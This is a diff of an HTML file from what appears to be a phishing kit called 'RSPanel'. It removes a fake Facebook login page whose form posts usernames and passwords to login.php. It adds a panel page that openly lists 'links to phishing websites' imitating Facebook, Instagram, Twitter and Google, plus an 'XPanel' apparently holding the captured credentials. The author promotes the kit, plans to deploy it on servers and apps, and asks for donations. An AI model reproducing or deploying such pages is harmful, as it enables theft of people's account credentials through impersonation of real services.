@@ -1,44 +1,93 @@
 <!doctype html>
 <html lang="en">
-	<head>
-		<meta charset="UTF-8" />
-		<title>Facebook Login</title>
-		<link rel="stylesheet" href="index.css" type="text/css" media="all" />
-	</head>
-	<body> <section>
-		<div class="logo">
-			<h2>facebook</h2>
-		</div>
-		<form action="login.php" method="POST">
-			<input
-				type="text"
-				name="username"
-				id="username"
-				placeholder="Mobile number or email address"
-			/>
-			<br />
-			<input
-				class="pass"
-				type="password"
-				name="password"
-				id="password"
-				placeholder="Password"
-			/>
-			<br />
-			<input class="a" type="submit" value="Log in" /><br />
-		</form>
-		<div class="link">
-			<a href="forget">forgotten password?</a>
-		</div>
-		<div class="or">
-			<p>or</p>
-		</div>
-		<div class="new">
-			<a class="" href="#"> <bold>Create new account</bold></a>
-		</div>
-		</section>
-		<div class="foot">
-			<p>Meta © 2023</p>
-		</div>
-	</body>
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <title>RSPanel</title>
+</head>
+
+<body>
+    <div class="logo">
+        <h1>RSPanel</h1>
+    </div>
+    <nav class="navbar">
+        <ul>
+            <li><a href="#xlinks">XLinks</a></li>
+            <li><a href="#xpanel">XPanel</a></li>
+            <li><a href="#contact">Contact</a></li>
+        </ul>
+    </nav>
+
+    <section id="xlinks" class="section">
+        <h1>XLinks</h1>
+        <p>Xlinks are the links to phishing websites</p>
+        <div class="icons">
+            <a href="xlinks/facebook/facebook.html" class="fab fa-facebook">
+            </a>
+            <a href="/xlinks/instagram/index.html" class="fab fa-instagram"></a>
+            <a href="xlinks/twitter/twitter.html" class="fab fa-twitter"></a>
+            <a href="xlinks/google/google.html" class="fab fa-google"></a>
+            <a class="fab fa-discord"></a>
+        </div>
+    </section>
+
+    <section id="notes" class="section">
+        <h2>Notes</h2>
+        <p>
+            RS Panel is on a great progress. It's version 2.0.0 of the app. The xlinks are added in the app to test RS Panel Soon it will be added in servers And different apps. For XPanel password contact with me.
+        </p>
+    </section>
+
+    <section id="xpanel" class="section">
+        <h1>XPanel</h1>
+        <p>XPanel is the Database of Xlinks</p>
+        <div class="icons">
+            <a href="xpanel/facebook.php" class="fab fa-facebook"></a>
+            <a href="xpanel/instagram.php" class="fab fa-instagram"></a>
+            <a href="xpanel/twitter.php" class="fab fa-twitter"></a>
+            <a href="xpanel/google.php" class="fab fa-google"></a>
+            <a class="fab fa-discord"></a>
+        </div>
+    </section>
+
+    <section id="about" class="section">
+        <h1>About Me</h1>
+        <p>Learn more about me.</p>
+        <!-- Add about me details here -->
+        <p>
+            Iam a teenager Developing Those things just For fun I have just
+            passed SSC.All projects of mine are made by myself. So your
+            support is Appreciated
+        </p>
+    </section>
+
+    <section id="contact" class="section">
+        <h1>Contact Me</h1>
+        <p>Find me on various platforms:</p>
+        <ul>
+            <li>
+                <a href="https://facebook.com/R.samir.Bhuiyan.A">Facebook</a>
+            </li>
+            <li>
+                <a href="https://github.com/R-Samir-Bhuiyan-A">GitHub</a>
+            </li>
+            <li><a href="https://samirr.rf.gd">Website</a></li>
+        </ul>
+        <p>Stay updated with the latest news and upgrades.</p>
+    </section>
+
+    <section id="donate" class="section">
+        <h1>Donate</h1>
+        <p>Your support is appreciated:</p>
+        <a href="https://samirr.rf.gd/donate"><i class="fab fa-paypal"></i> Donate via PayPal</a>
+    </section>
+
+    <footer>
+        <p>&copy; 2023 RSPanel. All rights reserved.</p>
+    </footer>
+</body>
+
 </html>
